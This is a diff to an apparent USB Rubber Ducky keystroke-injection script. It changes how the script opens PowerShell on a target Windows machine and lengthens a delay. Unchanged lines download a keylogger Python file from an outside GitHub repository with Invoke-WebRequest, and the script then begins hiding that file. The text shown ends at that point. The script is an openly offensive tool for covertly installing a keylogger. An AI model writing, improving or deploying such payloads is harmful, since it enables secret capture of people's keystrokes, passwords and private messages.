@@ -1,12 +1,12 @@
 DELAY 200
-GUI r
-DELAY 50
-STRING powershell Start-Process cmd -Verb runAs
+CONTROL ESCAPE
+DELAY 200
+STRING powershell
 ENTER
 DELAY 200
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "keylogger.py"
 ENTER
-DELAY 200
+DELAY 5000
 STRING $HIDE=Get-Item keylogger.py -Force
 ENTER
 DELAY 200
